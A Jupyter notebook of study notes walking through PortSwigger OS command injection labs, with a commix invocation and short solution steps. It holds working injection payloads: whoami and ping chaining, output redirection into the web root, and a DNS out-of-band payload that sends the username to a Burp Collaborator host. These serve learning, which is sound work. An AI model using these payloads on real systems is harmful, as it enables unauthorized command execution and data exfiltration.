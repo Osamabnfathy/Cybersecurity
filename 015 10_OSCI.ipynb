{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "--------------------------------------------------------------------------------------------\n",
    "                            # OS Command Injection                                     "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Resources:\n",
    "\n",
    ">> labs:  \n",
    "   - https://portswigger.net/web-security/os-command-injection\n",
    "   \n",
    ">> Video:\n",
    "   - https://www.youtube.com/watch?v=K5wFmDSKkSQ&list=PLTSGZiCtCBfMMLkmaN7tGEhbc0QbOEtEA&index=26"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# we can use *commix Tool* in kali:\n",
    " \n",
    "```bash\n",
    "commix --url=\"url\" --data=\"data\" --cookie=\"cookie\"\n",
    "\n",
    "commix --url=\"https://0a0400f304becb2380d867c500ff00ba.web-security-academy.net/product/stock\" --data=\"productId=2&storeId=1\" --cookie=\"session=j4ZHQ0KSCqtpOEvEcjEtGvoYpnVGdT7e\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-1: OS Command Injection, simple case:\n",
    "\n",
    "- First try to make an error by adding ' after any number of the storeId or productId\n",
    "- then the payload is (|whoami) after any word of the storeId or productId"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-2: Blind OS command injection with time delays:\n",
    "\n",
    "- First try to make an error to see if it's blind or not\n",
    "- If there is no response then it's blind\n",
    "- In Blind injection try to make a time delay in the response by adding (ping command)\n",
    "- The email function is vulnerable\n",
    "- The payload is\n",
    "```bash\n",
    "we@||ping -c 10 127.0.0.1||we.com \n",
    "then make a URL encoding for it"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-3: Blind OS command injection with output redirection:\n",
    "\n",
    "- First try to make an error by making a ping command \n",
    "- ping -c 10 127.0.0.1||    >> URL Encoding for it\n",
    "- then if you find the vulnerable function add this shell command to solve the lab\n",
    "\n",
    "```shell\n",
    "x||whoami > /var/www/images/whoami.txt||       \n",
    "```\n",
    "- add it in email with URL Encoding for it\n",
    "- Then open any post's photo and change the URL to (filename=whoami.txt)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-4: Blind OS command injection with out-of-band interaction:\n",
    "\n",
    "- You need a burp pro to solve the lab\n",
    "- the idea of the lab is to make the server to interact with your page \n",
    "- The payload in email function is \n",
    "```shell\n",
    "||nslookup+'whoami'.sdfsdf.burpcollaborator.net||\n",
    "\n",
    "it should replay by username.sdfsdf.burpcollaborator.net"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
